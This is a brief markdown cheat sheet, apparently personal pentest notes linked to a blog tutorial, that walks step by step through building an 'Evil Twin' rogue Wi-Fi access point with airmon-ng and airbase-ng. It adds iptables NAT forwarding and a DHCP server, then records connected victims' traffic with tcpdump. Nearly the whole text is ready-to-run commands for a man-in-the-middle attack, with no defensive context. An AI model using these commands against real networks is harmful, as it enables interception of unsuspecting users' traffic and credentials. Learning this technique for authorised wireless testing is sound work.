# Evil Twin
https://thecybersecurityman.com/2018/08/11/pentest-edition-creating-an-evil-twin-or-fake-access-point-using-aircrack-ng-and-dnsmasq-part-1-setup/
### Config Wireless Interface

See available wireless network interfaces to use

```airmon-ng```

Config wireless interface in mod monitor

```airmon-ng start wlan0```


### Config Facke AP

Create new screen for facke AP

```screen -S fakeAP```

Config facke AP

```airbase-ng -c 6 -e "FakeAPname" mon0 [wlan0mon, wlan0]```
```	```

Deatach from  screen

```Cntrl a d```

Connfig the IP to the new interface
```ifconfig at0 up```
```ifconfig at0 [IP-Address] netmask 255.255.255.0```

Check config

```ip route```

### Config Firewall

Configure iptables. The output interface is de internet exit interface

```iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE```

```iptables --append FORWARD --in-interface at0 -j ACCEPT```

Config forwarding

```echo 1 > /proc/sys/net/ipv4/ip_forward```


### Config DHCP

```dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhclient-eth0.pid at0```

```sudo systemctl start isc-dhcp-server.service```

```sudo systemctl status isc-dhcp-server.service```


### If failed

```sudo rm /var/run/dhcpd.pid```
```airmon-ng check kill```
```netstat -tupln```
```kill -9 [pid]```


### MITM Record 

```tcpdump -i at0 -w fileName.pcap -vv```
